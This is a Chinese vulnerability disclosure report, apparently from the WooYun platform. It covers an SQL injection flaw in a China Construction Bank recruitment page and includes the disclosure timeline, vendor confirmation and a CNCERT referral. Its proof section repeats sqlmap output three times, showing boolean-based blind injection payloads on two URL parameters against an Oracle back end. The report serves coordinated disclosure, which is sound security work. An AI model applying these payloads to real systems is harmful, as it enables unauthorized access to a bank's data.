wybug_title: 建设银行某系统存在SQL注射漏洞(有WAF)
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-10-27：	细节已通知厂商并且等待厂商处理中									2015-10-30：	厂商已经确认，细节仅向厂商公开									2015-11-09：	细节向核心白帽子及相关领域专家公开									2015-11-19：	细节向普通白帽子公开									2015-11-29：	细节向实习白帽子公开									2015-12-14：	细节向公众公开  简要描述： sql注射 详细说明：  目标系统：建行招聘频道 http://**.**.**.**/ccbjob/cn/job/index.jsp 

 问题链接：http://**.**.**.**/ccbjob/cn/job/resume/source.jsp?code_set_id=3007&sqlType=3&id=30077903&root=30077903 





   漏洞证明：  

最后把我ip封了~，哎上日志吧证明下吧
sqlmap identified the following injection points with a total of 613 HTTP(s) requests:---Parameter: code_set_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: code_set_id=3007' AND 4286=4286 AND 'qoLR'='qoLR&sqlType=3&id=30077903&root=30077903Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: code_set_id=3007&sqlType=3&id=30077903' AND 2065=2065 AND 'OsHl'='OsHl&root=30077903---web application technology: Apache, Servlet 2.5, JSP 2.1back-end DBMS: Oraclecurrent schema (equivalent to database on Oracle):	Nonesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: code_set_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: code_set_id=3007' AND 4286=4286 AND 'qoLR'='qoLR&sqlType=3&id=30077903&root=30077903Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: code_set_id=3007&sqlType=3&id=30077903' AND 2065=2065 AND 'OsHl'='OsHl&root=30077903---web application technology: Apache, Servlet 2.5, JSP 2.1back-end DBMS: Oraclecurrent schema (equivalent to database on Oracle):	Nonesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: code_set_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: code_set_id=3007' AND 4286=4286 AND 'qoLR'='qoLR&sqlType=3&id=30077903&root=30077903Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: code_set_id=3007&sqlType=3&id=30077903' AND 2065=2065 AND 'OsHl'='OsHl&root=30077903---web application technology: Apache, Servlet 2.5, JSP 2.1back-end DBMS: Oracle
   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-10-30 17:25 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT直接通报给建设银行集团公司,由其后续协调网站管理部门处置. 最新状态： 暂无
